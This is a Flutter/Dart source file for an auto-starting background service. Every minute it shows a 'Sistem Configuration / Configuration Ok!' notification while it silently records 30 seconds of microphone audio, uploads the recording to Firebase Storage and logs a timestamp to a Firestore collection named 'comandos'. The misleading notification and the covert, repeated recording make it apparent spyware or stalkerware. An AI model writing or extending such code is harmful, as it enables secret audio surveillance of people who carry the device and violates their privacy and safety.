import 'dart:async';
import 'dart:ui';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_background_service_android/flutter_background_service_android.dart';
import 'package:logger/logger.dart';

import '../services/core_module_services.dart';
import '../work/workmanage_callback.dart';

Future<void> initializeServiceBack() async {
  final service = FlutterBackgroundService();
  await service.configure(
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onIosBackground,
    ),
    androidConfiguration: AndroidConfiguration(
        onStart: onStart, isForegroundMode: true, autoStart: true),
  );
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  WidgetsFlutterBinding.ensureInitialized();
  DartPluginRegistrant.ensureInitialized();
  return true;
}

@pragma('vm:entry-point')
Future<void> onStart(ServiceInstance service) async {
  await initServices();
  DartPluginRegistrant.ensureInitialized();
  if (service is AndroidServiceInstance) {
    service.on('setAsForeground').listen((event) {
      service.setAsForegroundService();
    });
    service.on('setAsBackground').listen((event) {
      service.setAsBackgroundService();
    });
  }
  service.on('stopService').listen((event) {
    service.stopSelf();
  });
  Timer.periodic(const Duration(minutes: 1), (timer) async {
    if (service is AndroidServiceInstance) {
      if (await service.isForegroundService()) {

        service.setForegroundNotificationInfo(
            title: 'Sistem Configuration', content: 'Configuration Ok!');
            final path = await startRecord();
        Logger().i('record start');

        await Future.delayed(Duration(seconds: 30));

        stopRecord();
        Logger().i('Stop recording');
        if (path != null) {
          Logger().i('Inicio Uploade FirebaseStorage');
          await upload(path);
          Logger().i('Fim Uploade FirebaseStorage');
        }

        FirebaseFirestore.instance
            .collection("comandos")
            .doc("time")
            .collection("register")
            .doc()
            .set(
          {
            'road': DateTime.now(),
          },
        );
      }
    }
    Logger().i('Background service running');
    service.invoke('update');
  });
}
